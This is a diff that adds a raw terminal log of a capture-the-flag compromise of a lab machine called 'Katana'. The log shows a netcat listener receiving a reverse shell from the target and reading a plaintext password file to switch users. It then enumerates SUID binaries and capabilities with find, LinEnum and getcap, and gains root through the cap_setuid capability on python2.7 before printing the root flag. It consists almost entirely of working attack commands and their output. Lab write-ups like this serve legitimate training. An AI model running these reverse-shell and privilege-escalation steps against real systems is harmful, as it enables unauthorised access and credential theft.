@@ -1,0 +1,226 @@
+Dirb and fine upload.html
+Upload reverse shell
+
+hack@kali:~/CTF/Katana$ nc -lvnp 1234
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.119.
+Ncat: Connection from 192.168.1.119:41098.
+Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
+ 05:22:21 up 43 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+$ 
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ 
+$ python -c "import pty;pty.spawn('/bin/bash')"
+www-data@katana:/$ 
+
+www-data@katana:/$ llss
+
+bin   home            lib32       media  root  sys  vmlinuz
+boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
+dev   initrd.img.old  libx32      opt    sbin  usr
+etc   lib             lost+found  proc   srv   var
+www-data@katana:/$ ssttttyy  rraaww  --eecchhoo
+
+www-data@katana:/$ ls
+bin   home            lib32       media  root  sys  vmlinuz
+boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
+dev   initrd.img.old  libx32      opt    sbin  usr
+etc   lib             lost+found  proc   srv   var
+www-data@katana:/$ 
+www-data@katana:/$ 
+www-data@katana:/$ cd home
+www-data@katana:/home$ ls
+katana
+www-data@katana:/home$ cd katana
+www-data@katana:/home/katana$ ls -la
+total 28
+drwxr-xr-x 3 katana katana 4096 May 11 12:20 .
+drwxr-xr-x 3 root   root   4096 May 11 09:33 ..
+-rw-r--r-- 1 katana katana  220 May 11 09:33 .bash_logout
+-rw-r--r-- 1 katana katana 3526 May 11 09:33 .bashrc
+drwx------ 3 katana katana 4096 May 11 11:57 .gnupg
+-rw-r--r-- 1 katana katana  807 May 11 09:33 .profile
+-rw-r--r-- 1 root   root     19 May 11 11:52 .ssh_passwd
+www-data@katana:/home/katana$ cat .ssh_passwd
+katana@katana12345
+www-data@katana:/home/katana$ su katana
+www-data@katana:/home/katana$ su katana
+Password: katana12345
+uid=1000(katana) gid=1000(katana) groups=1000(katana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+katana@katana:~$ ls -la
+total 28
+drwxr-xr-x 3 katana katana 4096 May 11 12:20 .
+drwxr-xr-x 3 root   root   4096 May 11 09:33 ..
+-rw-r--r-- 1 katana katana  220 May 11 09:33 .bash_logout
+-rw-r--r-- 1 katana katana 3526 May 11 09:33 .bashrc
+drwx------ 3 katana katana 4096 May 11 11:57 .gnupg
+-rw-r--r-- 1 katana katana  807 May 11 09:33 .profile
+-rw-r--r-- 1 root   root     19 May 11 11:52 .ssh_passwd
+katana@katana:~$ sudo -l
+[sudo] password for katana: katana12345
+
+Sorry, user katana may not run sudo on katana.
+katana@katana:~$ 
+
+katana@katana:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+katana@katana:~$ 
+
+
+Run LinEnum.sh
+.....
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/usr/bin/wget
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1726 May 11 12:05 /etc/passwd
+-rw-r--r-- 1 root root 805 May 11 10:46 /etc/group
+-rw-r--r-- 1 root root 767 Mar  4  2016 /etc/profile
+-rw-r----- 1 root shadow 1013 May 11 10:45 /etc/shadow
+
+
+[-] SUID files:
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 436552 Jan 31 15:55 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 157192 Feb  2 02:41 /usr/bin/sudo
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+
+
+[-] SGID files:
+-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
+-rwxr-sr-x 1 root ssh 321672 Jan 31 15:55 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
+-rwxr-sr-x 1 root crontab 43568 Oct 11  2019 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /usr/sbin/unix_chkpwd
+
+
+[+] Files with POSIX capabilities set:
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/python2.7 = cap_setuid+ep
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 435 Aug 22  2018 /etc/logrotate.conf
+-rw-r--r-- 1 root root 2584 Aug  1  2018 /etc/gai.conf
+-rw-r--r-- 1 root root 2981 May 11 09:29 /etc/adduser.conf
+-rw-r--r-- 1 root root 346 Jan 14  2018 /etc/discover-modprobe.conf
+-rw-r--r-- 1 root root 604 Jun 26  2016 /etc/deluser.conf
+-rw-r--r-- 1 root root 494 Feb 10  2019 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 552 Feb 14  2019 /etc/pam.conf
+-rw-r--r-- 1 root root 642 Mar  1  2019 /etc/xattr.conf
+-rw-r--r-- 1 root root 34 Mar  2  2018 /etc/ld.so.conf
+-rw-r--r-- 1 root root 1988 Feb 26  2019 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 351 May 11 09:33 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 2351 May 31  2018 /etc/sysctl.conf
+-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
+-rw-r--r-- 1 root root 5713 May 11 09:38 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 2969 Feb 26  2019 /etc/debconf.conf
+-rw-r--r-- 1 root root 87 May 20 07:02 /etc/resolv.conf
+-rw-r--r-- 1 root root 144 May 11 09:33 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 191 Apr 25  2019 /etc/libaudit.conf
+-rw-r--r-- 1 root root 1260 Dec 14  2018 /etc/ucf.conf
+-rw-r--r-- 1 root root 5850 Mar  6  2019 /etc/vsftpd.conf
+-rw-r--r-- 1 root root 812 Jan  9 20:19 /etc/mke2fs.conf
+
+
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rw------- 1 root root 1726 May 11 12:05 /var/backups/passwd.bak
+-rw------- 1 root shadow 675 May 11 10:46 /var/backups/gshadow.bak
+-rw------- 1 root root 805 May 11 10:46 /var/backups/group.bak
+-rw------- 1 root shadow 1013 May 11 10:45 /var/backups/shadow.bak
+
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 May 11 09:29 .
+drwxr-xr-x 12 root root 4096 May 11 09:38 ..
+
+
+### SCAN COMPLETE ####################################
+katana@katana:~$ 
+katana@katana:~$ 
+katana@katana:~$ 
+katana@katana:~$ 
+katana@katana:~$ 
+katana@katana:~$ 
+katana@katana:~$ getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/python2.7 = cap_setuid+ep
+katana@katana:~$ /
+bash: /: Is a directory
+katana@katana:~$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+uid=0(root) gid=1000(katana) groups=1000(katana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+# cd /root
+# ls
+root.txt
+# cat root.txt
+{R00t_key_Katana_91!}
+# 
+
